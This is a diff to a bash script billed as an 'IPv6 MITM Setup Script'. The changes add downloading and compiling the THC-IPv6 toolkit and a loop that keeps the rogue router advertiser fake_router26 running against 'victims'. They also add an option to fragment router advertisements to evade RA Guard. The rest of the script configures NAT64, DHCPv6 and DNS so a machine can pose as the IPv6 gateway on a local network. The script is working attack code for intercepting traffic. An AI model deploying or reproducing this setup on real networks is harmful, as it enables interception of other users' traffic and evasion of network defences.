@@ -1,5 +1,5 @@
 #!/bin/bash
-PATH="/usr/bin:/usr/sbin:/bin:/sbin"
+PATH="/usr/bin:/usr/sbin:/bin:/sbin:/usr/local/bin"
 #
 # IPv6 MITM Setup Script
 # This script will install dependencies and configure the system for IPv6 infrastructure
@@ -7,6 +7,7 @@ PATH="/usr/bin:/usr/sbin:/bin:/sbin"
 # Run me as root!
 
 #GLOBALS
+
 #TAYGAINTERFACE default name for the Tayga virtual interface
 TAYGAINTERFACE="nat64"
 #DEFAULT6PREFIX default IPv6 prefix to present, we're assuming the reserved 64:FF9B::/96
@@ -40,6 +41,14 @@ DSECONDIP=""
 #If we get a blank we'll fall back to google
 #BINDFORWARDERS="8.8.8.8;"
 DEFAULTNAMESERVERS="8.8.8.8"
+
+#Download location for THC-IPv6 toolkit
+THCURL=http://www.thc.org/releases/thc-ipv6-2.3.tar.gz
+#Should we fragment our router advertisements?
+#FRAGMENT=false
+
+#fake_router26 log file
+ROUTERLOG="/var/log/router.log"
 
 ##CONFIG FILE LOCATIONS
 #wide-dhcpv6-server
@@ -209,7 +218,29 @@ function isPkgInstalled {
 function installPrereqDpkgs {
     /usr/bin/apt-get install -y sipcalc tayga radvd wide-dhcpv6-server bind9 iptables
 }
-#Set up Taya interface, IP addresses and routes, and and start Tayga
+#Install THC-IPv6 Toolkit
+function installTHC {
+    #assuming that if fake_router6 is installed, everything's installed. reasonable?
+    if hash fake_router6 2>/dev/null;
+    then
+	echo "THC-IPv6 toolkit installed."
+    else
+	read -p "Install THC-IPv6 toolkit? (Required for RA guard evasion.)" #also required for other features, one day...
+	if [[ $REPLY =~ [Yy] ]]
+	then 
+	    #prereqs
+	    /usr/bin/apt-get install -y make gcc libpcap0.8-dev libssl-dev
+	    wget ${THCURL}
+	    tar -zxvf thc-ipv6-2.3.tar.gz
+	    cd thc-ipv6-2.3
+	    make install
+	    #cleanup
+	    cd ..
+	    rm -rf thc-ipv6-2.3*
+	fi
+    fi
+}
+#Set up Tayga interface, IP addresses and routes, and and start Tayga
 function startTayga {
     # Set up interfaces
     ip addr add "${DIP6}/${DIP6CIDR}" dev $DINTERFACE
@@ -230,21 +261,44 @@ function stopTayga {
     ip link set $TAYGAINTERFACE down
     /usr/sbin/tayga --rmtun
 }
+#fake_router26 crashes when another victim on the system starts up, so we restart it automatically
+function startFakeRouter {
+    trap "" HUP
+    while true
+    do
+	echo "restarting router"
+	fake_router26 ${DINTERFACE} -E D -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other -D ${DIP6} -d 30
+	sleep 3
+    done
+}
 
 #EXECUTION
+#cleanup old instances of suddensix & fake_router running in the background
+killall suddensix.sh -o 2s 2>/dev/null
+killall fake_router26 2>/dev/null
 
 /bin/ping6 -c 3 google.com && ( echo "I am able to IPv6 ping google.com already, bailing out."; exit )
-
 
 #Kind of mindless for now just install the packages we need first
 echo "Welcome, I'll install a few packages and ask a couple of questions first"
 installPrereqDpkgs
+installTHC
 # Prompt for network interface to use
 read -p "Please enter the interface name to listen on (default ${DINTERFACE}): " DINTERFACE
 echo "This is your current address information: "
 sipcalc $DINTERFACE
 # Prompt for second IP on the subnet
 read -p "Please enter an additional available IPv4 address in this range: " DSECONDIP
+# If we can, ask whether we should fragment RAs
+FRAGMENT=false
+if hash fake_router26 2> /dev/null;
+then
+    read -p "Fragment router advertisements to evade RA Guard? [y/n] "
+    if [[ $REPLY =~ [Yy] ]]
+    then
+	FRAGMENT=true
+    fi
+fi
 #Configure these system parameters in a non-persistent way for now
 loadIPv6Module
 enableForwarding
@@ -253,7 +307,10 @@ clearIpTables
 stopTayga
 
 setBind9Options
-setRADvdConf
+if ! $FRAGMENT
+then
+    setRADvdConf
+fi
 setWideDhcp6Conf
 setTaygaConf
 #Most of the non-persistent configuration is in startTayga
@@ -263,7 +320,14 @@ if startTayga; then
     #TODO: check if we need to enable them
     service radvd stop
     sleep 3
-    service radvd start
+    if $FRAGMENT
+    then
+	startFakeRouter >> ${ROUTERLOG} 2>&1 & 
+	echo "fake_router26 should be running as daemon
+logfile at ${ROUTERLOG}"
+    else
+	service radvd start
+    fi
     service bind9 restart
     service wide-dhcpv6-server restart
     #More non-persistent configuration
